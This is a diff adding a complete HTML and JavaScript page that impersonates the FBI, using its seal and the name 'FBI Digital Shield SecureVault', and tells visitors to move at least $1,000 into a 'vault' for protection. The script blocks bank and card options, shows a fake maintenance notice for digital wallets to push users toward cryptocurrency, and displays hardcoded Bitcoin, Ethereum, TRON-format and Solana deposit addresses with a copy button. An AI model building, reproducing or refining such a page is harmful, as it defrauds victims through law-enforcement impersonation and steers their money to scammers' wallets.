@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Secure Funds - FBI Digital Shield</title>
+
+<style>
+/* =========================
+   T.B GLOBAL DESIGN SYSTEM
+   (EXACT MATCH WITH INDEX.HTML)
+========================= */
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+    font-family: Arial, sans-serif;
+    background: radial-gradient(circle at top, #1e1b4b, #020617);
+    color: white;
+}
+
+/* =========================
+   SECTION WRAPPER
+========================= */
+
+.section {
+    padding: 60px 20px;
+    text-align: center;
+}
+
+/* =========================
+   NAVBAR
+========================= */
+
+.navbar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 30px;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.logo-img {
+    width: 40px;
+    height: 40px;
+    object-fit: cover;
+    border-radius: 50%;
+}
+
+.logo-text {
+    font-weight: bold;
+    font-size: 24px;
+}
+
+/* =========================
+   DASHBOARD CONTAINER (USED HERE TOO)
+========================= */
+
+.dashboard-container {
+    max-width: 900px;
+    margin: auto;
+    padding: 20px;
+}
+
+/* =========================
+   WELCOME BOX
+========================= */
+
+.welcome-box {
+    background: rgba(255,255,255,0.05);
+    padding: 25px;
+    border-radius: 12px;
+    backdrop-filter: blur(10px);
+    margin-bottom: 25px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+}
+
+/* =========================
+   CARDS (MATCH HOMEPAGE STYLE)
+========================= */
+
+.dashboard-card {
+    background: rgba(255,255,255,0.05);
+    padding: 20px;
+    border-radius: 12px;
+    backdrop-filter: blur(10px);
+    margin-bottom: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+}
+
+/* =========================
+   INPUT FIELD (CLEAN VERSION)
+========================= */
+
+input[type="number"] {
+    width: 100%;
+    padding: 14px;
+    margin-top: 10px;
+    border-radius: 12px;
+    border: none;
+    outline: none;
+    background: rgba(0,0,0,0.2);
+    color: white;
+    border: 1px solid rgba(255,255,255,0.08);
+}
+
+input[type="number"]:focus {
+    border-color: #9333ea;
+    background: rgba(255,255,255,0.08);
+}
+
+.amount-box{
+    display:flex;
+    align-items:center;
+
+    margin-top:14px;
+
+    background:rgba(255,255,255,0.05);
+
+    border:1px solid rgba(255,255,255,0.08);
+
+    border-radius:18px;
+
+    padding:0 18px;
+
+    transition:0.25s ease;
+}
+
+.amount-box:focus-within{
+    border-color:#9333ea;
+    background:rgba(255,255,255,0.08);
+
+    box-shadow:0 0 0 4px rgba(147,51,234,0.15);
+}
+
+.currency{
+    font-size:26px;
+    font-weight:bold;
+    color:#c084fc;
+
+    margin-right:10px;
+}
+
+.amount-box input{
+    flex:1;
+
+    background:transparent;
+    border:none;
+    outline:none;
+
+    color:white;
+
+    padding:20px 0;
+
+    font-size:28px;
+    font-weight:600;
+}
+
+.amount-box input::placeholder{
+    color:#64748b;
+}
+
+.amount-note{
+    margin-top:12px;
+    font-size:13px;
+    color:#94a3b8;
+}
+
+/* =========================
+   RADIO OPTIONS
+========================= */
+
+label {
+    color: #cbd5f5;
+    font-size: 14px;
+    display: flex;
+    gap: 10px;
+    align-items: center;
+}
+
+.method-grid{
+    display:grid;
+    gap:14px;
+    margin-top:18px;
+}
+
+.method-card{
+    display:flex;
+    align-items:center;
+    gap:15px;
+
+    padding:18px;
+    border-radius:16px;
+
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.08);
+
+    cursor:pointer;
+    transition:0.25s ease;
+}
+
+.method-card:hover{
+    transform:translateY(-2px);
+    background:rgba(255,255,255,0.08);
+}
+
+.method-card input{
+    transform:scale(1.2);
+}
+
+.method-card h4{
+    margin-bottom:5px;
+}
+
+.method-card p{
+    font-size:13px;
+    color:#94a3b8;
+}
+
+/* =========================
+   BUTTONS (MATCH HOMEPAGE)
+========================= */
+
+.primary {
+    background: linear-gradient(45deg, #9333ea, #ec4899);
+    border: none;
+    padding: 15px 25px;
+    border-radius: 30px;
+    color: white;
+    cursor: pointer;
+    transition: 0.2s ease;
+}
+
+.primary:hover {
+    transform: scale(1.02);
+}
+
+/* =========================
+   TEXT
+========================= */
+
+h1, h2, h3 {
+    margin-bottom: 15px;
+}
+
+p {
+    color: #cbd5f5;
+}
+
+/* =========================
+   SMALL UX IMPROVEMENT
+========================= */
+
+.dashboard-card h3 {
+    margin-bottom: 10px;
+}   
+
+.wallet-grid{
+    display:grid;
+    gap:12px;
+    margin-top:15px;
+}
+
+.wallet-card{
+    display:flex;
+    align-items:center;
+    gap:15px;
+
+    padding:16px;
+
+    border-radius:16px;
+
+    background:rgba(255,255,255,0.04);
+
+    border:1px solid rgba(255,255,255,0.08);
+
+    cursor:pointer;
+
+    transition:0.25s ease;
+}
+
+.wallet-card:hover{
+    transform:translateY(-2px);
+
+    background:rgba(255,255,255,0.08);
+
+    border-color:#9333ea;
+}
+
+.wallet-icon{
+    width:42px;
+    height:42px;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    border-radius:50%;
+
+    background:rgba(255,255,255,0.08);
+
+    border:1px solid rgba(255,255,255,0.1);
+
+    font-size:18px;
+    font-weight:bold;
+
+    color:#c084fc;
+}
+
+.wallet-info h4{
+    margin:0;
+    color:white;
+}
+
+.wallet-info p{
+    margin-top:4px;
+    font-size:12px;
+    color:#94a3b8;
+}
+  
+</style>
+</head>
+
+<body>
+
+<!-- 🔝 NAVBAR -->
+<header class="navbar">
+
+    <div class="logo">
+        <img src="https://www.ic3.gov/img/fbi_seal_new.webp" class="logo-img">
+        <div class="logo-text">FBI Digital Shield SecureVault</div>
+    </div>
+
+</header>
+
+<!-- 🏦 SECURE FUNDS SECTION -->
+<section class="section">
+
+    <div class="dashboard-container">
+
+        
+
+            <h2>Secure Your Funds</h2>
+
+            <p>
+                Move your money into the vault for temporary protection.
+            </p>
+
+        </div>
+
+        <!-- 💰 AMOUNT INPUT -->
+<div class="dashboard-card">
+
+    <h3>Enter Amount</h3>
+
+    <div class="amount-box">
+
+        <span class="currency">$</span>
+
+        <input
+            type="number"
+            id="amount"
+            placeholder="0.00"
+        >
+
+    </div>
+
+    <p class="amount-note">
+        Minimum secure transfer: $1,000
+    </p>
+
+</div>
+
+        <!-- 💳 TRANSFER METHOD -->
+<div class="dashboard-card">
+
+    <h3>Select Transfer Method</h3>
+
+    <div class="method-grid">
+
+      <label class="method-card">
+    <input type="radio" name="method" value="bank">
+    <div>
+        <h4>🏦 Bank Transfer</h4>
+        <p>Currently unavailable</p>
+    </div>
+</label>
+
+<label class="method-card">
+    <input type="radio" name="method" value="crypto">
+    <div>
+        <h4>🪙 Cryptocurrency Transfer</h4>
+        <p>Available</p>
+    </div>
+</label>
+
+<label class="method-card">
+    <input type="radio" name="method" value="card">
+    <div>
+        <h4>💳 Card Payment</h4>
+        <p>Currently unavailable</p>
+    </div>
+</label>
+
+<label class="method-card">
+    <input type="radio" name="method" value="wallet">
+    <div>
+        <h4>📲 Digital Wallet</h4>
+        <p>Available</p>
+    </div>
+</label>
+
+    </div>
+
+</div>
+
+        </div>
+
+<!-- 🪙 CRYPTO MODAL -->
+<div id="cryptoModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+background:rgba(0,0,0,0.7); backdrop-filter:blur(6px); justify-content:center; align-items:center;">
+
+    <div style="background:#0f172a; padding:20px; border-radius:16px; width:90%; max-width:400px;">
+
+        <h3>Select Cryptocurrency</h3>
+
+        <div style="margin-top:15px; display:grid; gap:10px;">
+
+            <button class="primary" onclick="selectCrypto('Bitcoin (BTC)')">₿ Bitcoin (BTC)</button>
+
+            <button class="primary" onclick="selectCrypto('Ethereum (ETH)')">◆ Ethereum (ETH)</button>
+
+            <button class="primary" onclick="selectCrypto
+            ('TON (USDT)')">₮ TON (USDT)</button>
+
+            <button class="primary" onclick="selectCrypto('Solana (SOL)')">◎ Solana (SOL)</button>
+
+        </div>
+
+        <button style="margin-top:15px; width:100%; background:transparent; border:1px solid #555;
+        color:white; padding:10px; border-radius:10px;"
+        onclick="closeCryptoModal()">
+            Close
+        </button>
+
+    </div>
+
+</div>
+
+<!-- 📋 PROOF MODAL -->
+<div id="proofModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+background:rgba(0,0,0,0.75); backdrop-filter:blur(6px); justify-content:center; align-items:center;">
+
+    <div style="background:#0f172a; padding:20px; border-radius:16px; width:90%; max-width:420px;">
+
+        <h3>Transaction Proof </h3>
+
+        <p id="proofText" style="margin-top:12px; background:rgba(255,255,255,0.05); padding:12px;
+        border-radius:10px; font-size:13px; color:#cbd5f5;">
+        </p>
+
+        <button class="primary" style="width:100%; margin-top:15px;" onclick="copyProof()">
+            Copy Address
+        </button>
+
+        <button style="margin-top:10px; width:100%; background:transparent; border:1px solid #555;
+        color:white; padding:10px; border-radius:10px;"
+        onclick="closeProofModal()">
+            Close
+        </button>
+
+    </div>
+
+</div>
+
+<!-- 📲 WALLET MODAL -->
+<div id="walletModal" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+backdrop-filter:blur(6px);
+justify-content:center;
+align-items:center;
+">
+
+    <div style="
+    background:#0f172a;
+    padding:20px;
+    border-radius:16px;
+    width:90%;
+    max-width:400px;
+    ">
+
+        <h3>Select Digital Wallet</h3>
+
+        <div style="display:grid; gap:10px; margin-top:15px;">
+
+            <div class="wallet-grid">
+
+<div class="wallet-card" onclick="selectWallet('PayPal')">
+
+    <div class="wallet-icon">P</div>
+
+    <div class="wallet-info">
+        <h4>PayPal</h4>
+        <p>Digital Wallet</p>
+    </div>
+</div>
+
+<div class="wallet-card" onclick="selectWallet('Cash App')">
+
+    <div class="wallet-icon">$</div>
+
+    <div class="wallet-info">
+        <h4>Cash App</h4>
+        <p>Digital Wallet</p>
+    </div>
+
+</div>
+
+<div class="wallet-card" onclick="selectWallet('Skrill')">
+
+    <div class="wallet-icon">S</div>
+
+    <div class="wallet-info">
+        <h4>Skrill</h4>
+        <p>Digital Wallet</p>
+    </div>
+
+</div>
+
+<div class="wallet-card" onclick="selectWallet('Wise')">
+
+    <div class="wallet-icon">W</div>
+
+    <div class="wallet-info">
+        <h4>Wise</h4>
+        <p>Digital Wallet</p>
+    </div>
+
+</div>    
+
+</div> <!-- wallet-grid -->
+
+<button
+style="
+margin-top:15px;
+width:100%;
+background:transparent;
+border:1px solid #555;
+color:white;
+padding:10px;
+border-radius:10px;
+"
+onclick="closeWalletModal()">
+Close
+</button>
+
+</div> <!-- modal content -->
+
+</div> <!-- walletModal -->
+
+    </div>
+
+<div id="walletProofModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+background:rgba(0,0,0,0.75); backdrop-filter:blur(6px); justify-content:center; align-items:center;">
+
+    <div style="background:#0f172a; padding:20px; border-radius:16px; width:90%; max-width:420px;">
+
+        <h3>Wallet Integration Status</h3>
+
+        <p id="walletProofText" style="margin-top:12px; background:rgba(255,255,255,0.05);
+        padding:12px; border-radius:10px; font-size:13px; color:#cbd5f5;">
+        </p>
+
+        <button class="primary" style="width:100%; margin-top:15px;" onclick="closeWalletProof()">
+            Close
+        </button>
+
+    </div>
+
+</div>
+
+<!-- 🚀 BUTTON -->
+<button class="primary" id="secureBtn"
+style="width:100%; margin-top:20px;">
+
+    Move Funds to T.B Vault
+
+</button>
+
+</section>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="assets/js/auth.js"></script>
+
+<script>
+
+let isProcessing = false;
+
+let currentUser = refreshCurrentUser();
+
+if (!currentUser) {
+    window.location.href = "login.html";
+}
+
+const secureBtn = document.getElementById("secureBtn");
+
+secureBtn.addEventListener("click", async function () {
+
+    if (isProcessing) return;
+    isProcessing = true;
+
+    let amount = parseFloat(document.getElementById("amount").value);
+    let method = document.querySelector('input[name="method"]:checked');
+
+    if (!amount || amount <= 0) {
+        alert("Enter valid amount");
+        isProcessing = false;
+        return;
+    }
+
+    if (!method) {
+        alert("Select transfer method");
+        isProcessing = false;
+        return;
+    }
+
+    // ❌ unavailable methods
+    if (method.value === "card" || method.value === "bank") {
+        alert("This transfer method is currently unavailable.");
+        isProcessing = false;
+        return;
+    }
+
+    // 🪙 crypto flow (open modal)
+    if (method.value === "crypto") {
+        document.getElementById("cryptoModal").style.display = "flex";
+        isProcessing = false;
+        return;
+    }
+
+if (method.value === "wallet") {
+
+    document.getElementById(
+        "walletModal"
+    ).style.display = "flex";
+
+    isProcessing = false;
+
+    return;
+}
+
+const { error } = await supabaseClient
+    .from("transactions")
+    .insert([
+        {
+            user_id: currentUser.id,
+            type: "SECURE_FUNDS",
+            amount: amount,
+            method: method.value,
+            status: "PENDING"
+        }
+    ]);
+
+if (error) {
+    console.log(error);
+    alert("Failed to submit request");
+    isProcessing = false;
+    return;
+}
+
+    alert(
+    "Your secure funds request has been submitted and is awaiting approval."
+);
+
+    window.location.href = "dashboard.html";
+    
+    setTimeout(() => {
+    isProcessing = false;
+}, 1500);
+});
+
+function closeCryptoModal() {
+    document.getElementById("cryptoModal").style.display = "none";
+}
+
+function selectCrypto(name) {
+
+    closeCryptoModal();
+
+    const address = cryptoAddresses[name] || "No address available";
+
+    const message =
+`Payment Address
+
+Coin: ${name}
+
+Address:
+${address}
+`;
+
+    document.getElementById("proofText").innerText = message;
+    document.getElementById("proofModal").style.display = "flex";
+
+    window.currentCryptoAddress = address;
+}
+
+const cryptoAddresses = {
+    "Bitcoin (BTC)": "bc1qdmdth3gtyduzgxmpkxls3enchjnpm3w6h3gx0m",
+    "Ethereum (ETH)": "0x9446fcc5e58c53bb3ffB0f722E6078582Cc9aB38",
+     
+    "TON (USDT)": "TRNNxUv2QYezdA63AsjKDNfXYjNmoxrmFH",
+    
+    "Solana (SOL)": "CBcE3FUhKUauxxL5PAEGiwwCECTh4V3SEzQaankU3KfR",
+};
+
+function copyProof() {
+    const address = window.currentCryptoAddress;
+
+    if (!address) {
+        alert("Nothing to copy");
+        return;
+    }
+
+    // Try modern method first
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(address)
+            .then(() => alert("Address copied successfully"))
+            .catch(fallbackCopy);
+    } else {
+        fallbackCopy();
+    }
+
+    function fallbackCopy() {
+        const temp = document.createElement("textarea");
+        temp.value = address;
+
+        // Prevent keyboard pop-up on mobile
+        temp.setAttribute("readonly", "");
+        temp.style.position = "absolute";
+        temp.style.left = "-9999px";
+
+        document.body.appendChild(temp);
+        temp.select();
+        temp.setSelectionRange(0, 99999);
+
+        try {
+            document.execCommand("copy");
+            alert("Address copied successfully");
+        } catch (err) {
+            alert("Copy failed. Long press to copy manually.");
+        }
+
+        document.body.removeChild(temp);
+    }
+}
+
+function closeProofModal() {
+    document.getElementById("proofModal").style.display = "none";
+}
+
+function closeWalletModal() {
+    document.getElementById("walletModal").style.display = "none";
+    document.querySelectorAll('input[name="method"]').forEach(r => r.checked = false);
+}
+
+function selectWallet(walletName) {
+    
+    closeWalletModal();
+    
+    const message =
+        `T.B SecureVault - WALLET STATUS
+
+Wallet Selected: ${walletName}
+Status: Integration Updating
+
+Note:
+This wallet system is currently under maintenance.
+Please use Cryptocurrency Transfer for secure funding.
+
+
+Timestamp: ${new Date().toLocaleString()}
+`;
+    
+    document.getElementById("walletProofText").innerText = message;
+    document.getElementById("walletProofModal").style.display = "flex";
+}
+
+function closeWalletProof() {
+    document.getElementById("walletProofModal").style.display = "none";
+    goToDashboard();
+}
+
+function goToDashboard() {
+    window.location.href = "dashboard.html";
+}
+
+</script>
+</body>
+</html>
